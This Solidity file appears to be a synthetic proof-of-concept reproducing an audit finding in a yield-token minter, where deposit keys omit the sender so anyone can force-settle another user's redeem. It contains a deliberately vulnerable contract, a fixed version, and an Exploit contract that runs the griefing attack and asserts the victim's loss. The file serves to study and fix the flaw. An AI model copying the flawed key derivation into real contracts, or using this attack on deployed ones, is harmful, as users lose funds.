// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  FIVA YTMinter — RedeemDeposit init_state omits the jetton sender
    (Trail of Bits, Tarun Bansal, May 2025, finding 57083).
    SYNTHETIC, cheatcode-free reduction of contracts/YT/redeem.fc and
    contracts/YT/redeem/deposit.fc. One transaction, no warp.

    register_jetton derives the RedeemDeposit from (minter, recipient)
    only. Anyone who names Alice as recipient hits her deposit. Eve
    supplies 1 nano YT, the deposit finalizes min(PT, YT) = 1, and
    Alice's follow-up redeem of the original N reverts because that
    deposit was destroyed. N-1 PT is pushed back; she is paid 1 SY,
    not N. The fixed key includes msg.sender, so Eve cannot close
    Alice's deposit and Alice's own two legs pay N SY. */

contract Jetton {
    string public name;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n) {
        name = n;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        _move(msg.sender, to, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        require(allowed >= amount, "allow");
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        _move(from, to, amount);
        return true;
    }

    function _move(address from, address to, uint256 amount) internal {
        require(balanceOf[from] >= amount, "bal");
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
    }
}

contract YTMinter {
    Jetton public pt;
    Jetton public yt;
    Jetton public sy;
    uint256 public syPaid;

    struct Dep {
        uint256 ptBal;
        uint256 ytBal;
        bool open;
        bool destroyed;
    }

    mapping(bytes32 => Dep) public deps;

    constructor(Jetton pt_, Jetton yt_, Jetton sy_) {
        pt = pt_;
        yt = yt_;
        sy = sy_;
    }

    /// FunC calculate_redeem_deposit_state_init(my_address(), recipient, code).
    /// The jetton sender is not in the init state.
    function depositKey(address recipient) public view returns (bytes32) {
        // @> VULN: init_state is (minter, recipient). The sender is omitted, so any caller hits this deposit.
        return keccak256(abi.encode(address(this), recipient));
    }

    function registerJetton(address recipient, uint256 ptAmt, uint256 ytAmt) external {
        bytes32 key = depositKey(recipient);
        Dep storage d = deps[key];
        require(!d.destroyed, "destroyed");
        if (ptAmt > 0) require(pt.transferFrom(msg.sender, address(this), ptAmt), "pt");
        if (ytAmt > 0) require(yt.transferFrom(msg.sender, address(this), ytAmt), "yt");
        d.open = true;
        d.ptBal += ptAmt;
        d.ytBal += ytAmt;
        _maybeFinalize(key, recipient);
    }

    function _maybeFinalize(bytes32 key, address recipient) internal {
        Dep storage d = deps[key];
        uint256 ptSum = d.ptBal;
        uint256 ytSum = d.ytBal;
        if (ptSum > 0 && ytSum > 0) {
            uint256 redeemed = ptSum < ytSum ? ptSum : ytSum;
            uint256 ptExcess = ptSum - redeemed;
            uint256 ytExcess = ytSum - redeemed;
            sy.mint(recipient, redeemed);
            syPaid += redeemed;
            if (ptExcess > 0) require(pt.transfer(recipient, ptExcess), "pt back");
            if (ytExcess > 0) require(yt.transfer(recipient, ytExcess), "yt back");
            d.ptBal = 0;
            d.ytBal = 0;
            d.open = false;
            d.destroyed = true;
        }
    }

    function finishRedeem(uint256 ytAmt) external {
        bytes32 key = depositKey(msg.sender);
        require(!deps[key].destroyed, "redeem closed");
        require(yt.transferFrom(msg.sender, address(this), ytAmt), "yt");
        deps[key].ytBal += ytAmt;
        _maybeFinalize(key, msg.sender);
    }
}

contract YTMinterFixed {
    Jetton public pt;
    Jetton public yt;
    Jetton public sy;
    uint256 public syPaid;

    struct Dep {
        uint256 ptBal;
        uint256 ytBal;
        bool open;
        bool destroyed;
    }

    mapping(bytes32 => Dep) public deps;

    constructor(Jetton pt_, Jetton yt_, Jetton sy_) {
        pt = pt_;
        yt = yt_;
        sy = sy_;
    }

    function depositKey(address recipient) public view returns (bytes32) {
        return keccak256(abi.encode(address(this), recipient, msg.sender));
    }

    function balancesOf(address recipient, address sender) external view returns (uint256 ptBal, uint256 ytBal) {
        Dep storage d = deps[keccak256(abi.encode(address(this), recipient, sender))];
        return (d.ptBal, d.ytBal);
    }

    function registerJetton(address recipient, uint256 ptAmt, uint256 ytAmt) external {
        bytes32 key = depositKey(recipient);
        Dep storage d = deps[key];
        require(!d.destroyed, "destroyed");
        if (ptAmt > 0) require(pt.transferFrom(msg.sender, address(this), ptAmt), "pt");
        if (ytAmt > 0) require(yt.transferFrom(msg.sender, address(this), ytAmt), "yt");
        d.open = true;
        d.ptBal += ptAmt;
        d.ytBal += ytAmt;
        _maybeFinalize(key, recipient);
    }

    function _maybeFinalize(bytes32 key, address recipient) internal {
        Dep storage d = deps[key];
        uint256 ptSum = d.ptBal;
        uint256 ytSum = d.ytBal;
        if (ptSum > 0 && ytSum > 0) {
            uint256 redeemed = ptSum < ytSum ? ptSum : ytSum;
            uint256 ptExcess = ptSum - redeemed;
            uint256 ytExcess = ytSum - redeemed;
            sy.mint(recipient, redeemed);
            syPaid += redeemed;
            if (ptExcess > 0) require(pt.transfer(recipient, ptExcess), "pt back");
            if (ytExcess > 0) require(yt.transfer(recipient, ytExcess), "yt back");
            d.ptBal = 0;
            d.ytBal = 0;
            d.open = false;
            d.destroyed = true;
        }
    }

    function finishRedeem(uint256 ytAmt) external {
        bytes32 key = depositKey(msg.sender);
        require(!deps[key].destroyed, "redeem closed");
        require(yt.transferFrom(msg.sender, address(this), ytAmt), "yt");
        deps[key].ytBal += ytAmt;
        _maybeFinalize(key, msg.sender);
    }
}

contract Wallet {
    function approve(Jetton token, address spender, uint256 amount) external {
        token.approve(spender, amount);
    }

    function register(YTMinter minter, uint256 ptAmt, uint256 ytAmt) external {
        minter.registerJetton(address(this), ptAmt, ytAmt);
    }

    function registerFor(YTMinter minter, address recipient, uint256 ptAmt, uint256 ytAmt) external {
        minter.registerJetton(recipient, ptAmt, ytAmt);
    }

    function registerForFixed(YTMinterFixed minter, address recipient, uint256 ptAmt, uint256 ytAmt) external {
        minter.registerJetton(recipient, ptAmt, ytAmt);
    }

    function registerFixed(YTMinterFixed minter, uint256 ptAmt, uint256 ytAmt) external {
        minter.registerJetton(address(this), ptAmt, ytAmt);
    }

    function finish(YTMinter minter, uint256 ytAmt) external {
        minter.finishRedeem(ytAmt);
    }

    function finishFixed(YTMinterFixed minter, uint256 ytAmt) external {
        minter.finishRedeem(ytAmt);
    }
}

contract Exploit {
    uint256 public constant N = 1_000_000_000;

    Jetton public pt; // nonce 1
    Jetton public yt; // nonce 2
    Jetton public sy; // nonce 3
    YTMinter public minter; // nonce 4
    Wallet public alice; // nonce 5

    bool public followUpReverted;
    uint256 public syToAlice;
    uint256 public ptBack;

    constructor() {
        pt = new Jetton("PT");
        yt = new Jetton("YT");
        sy = new Jetton("SY");
        minter = new YTMinter(pt, yt, sy);
        alice = new Wallet();
    }

    function run() external {
        pt.mint(address(alice), N);
        yt.mint(address(alice), N);
        yt.mint(address(this), 1);
        alice.approve(pt, address(minter), N);
        alice.approve(yt, address(minter), N);
        yt.approve(address(minter), 1);
        alice.register(minter, N, 0);
        (uint256 ptHeld,,,) = minter.deps(minter.depositKey(address(alice)));
        require(ptHeld == N, "alice PT sitting in the shared deposit");
        minter.registerJetton(address(alice), 0, 1);
        syToAlice = sy.balanceOf(address(alice));
        ptBack = pt.balanceOf(address(alice));
        require(syToAlice == 1, "forced settle paid 1");
        require(ptBack == N - 1, "N-1 PT pushed back");
        (bool ok,) = address(alice).call(abi.encodeWithSelector(alice.finish.selector, minter, N));
        followUpReverted = !ok;
        require(followUpReverted, "follow-up redeem must revert");
        require(sy.balanceOf(address(alice)) == 1, "still 1 SY");
        require(yt.balanceOf(address(alice)) == N, "YT never redeemed");
        require(minter.syPaid() == 1, "minter paid 1");
    }
}
